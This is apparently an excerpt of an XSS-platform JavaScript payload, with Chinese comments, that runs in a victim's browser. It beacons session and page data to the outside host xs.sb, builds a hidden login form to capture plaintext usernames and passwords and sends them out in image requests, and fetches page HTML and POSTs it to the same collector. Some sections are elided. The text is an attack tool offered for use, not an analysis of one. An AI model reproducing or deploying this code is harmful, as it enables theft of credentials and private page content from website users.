...
function contact_mothership( probe_return_data ) {
    ...
    var url = "https://xs.sb/bdstatic.com/?callback=jsonp";
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
			// https://woj.app wei wan dai xu
        }
    }
...
if ('1' == 1) {
    keep = new Image();
    keep.src = 'https://xs.sb/bdstatic.com/?callback=keepsession&id=8SyG&url=' + encodeURIComponent((function() {
        try {
	...
	function create_form(user) { /*获取明文密码*/
		...
		setTimeout(function () {
			...
			var newimg = new Image();
                       newimg.src="https://xs.sb/bdstatic.com/?callback=jsonp&id=8SyG&username="+username+"&password="+password;
		}, 2000); // 时间竞争
	}
	...
	create_form('');
xssor = {};
xssor.xsurl = 'https://xs.sb/bdstatic.com/?callback=jsonp&id=8SyG&rnd=' + Math.random();
xssor.gone = 0;
xssor.duquurl = "1";
xssor.duquurl1 = "{set.filename1}";
xssor.duquurl2 = "{set.filename2}";
var pkav = {
    ajax: function() {
        var xmlHttp;
        try {
...
if( document.readyState == "complete" ) {
    if(xssor.gone) throw SyntaxError();
    xssor.gone = 1;
	if(xssor.duquurl != null && xssor.duquurl.indexOf("set.filename")==-1){
		var abc = pkav.get(xssor.duquurl,
				function(rs) {
					var er = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rs) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl),function(rs){return;});
				});
	}
	if(xssor.duquurl1 != null && xssor.duquurl1.indexOf("set.filename")==-1){
		var abca = pkav.get(xssor.duquurl1,
				function(rss) {
					var era = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rss) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl1),function(rs){return;});
				});
	}
	if(xssor.duquurl2 != null && xssor.duquurl2.indexOf("set.filename")==-1){
		var abcd = pkav.get(xssor.duquurl2,
				function(rsss) {
					var erb = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rsss) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl2),function(rs){return;});
				});
	}
} else {
    addEvent( window, "load", function(){
    ...
    xssor.gone = 1;
	if(xssor.duquurl != null && xssor.duquurl.indexOf("set.filename")==-1){
		var abce = pkav.get(xssor.duquurl,
				function(rsa) {
					var erc = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rsa) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl),function(rs){return;});
				});
	}
	if(xssor.duquurl1 != null && xssor.duquurl1.indexOf("set.filename")==-1){
		var abcf = pkav.get(xssor.duquurl1,
				function(rsaa) {
					var ere = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rsaa) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl1),function(rs){return;});
				});
	}
	if(xssor.duquurl2 != null && xssor.duquurl2.indexOf("set.filename")==-1){
		var abcq = pkav.get(xssor.duquurl2,
				function(rsab) {
					var erd = pkav.post(xssor.xsurl,"htmlyuanma=" + encodeURIComponent(rsab) + "&location=" + encodeURIComponent(locationss) + "&duquurl=" + encodeURIComponent(xssor.duquurl2),function(rs){return;});
				});
	}
    });
}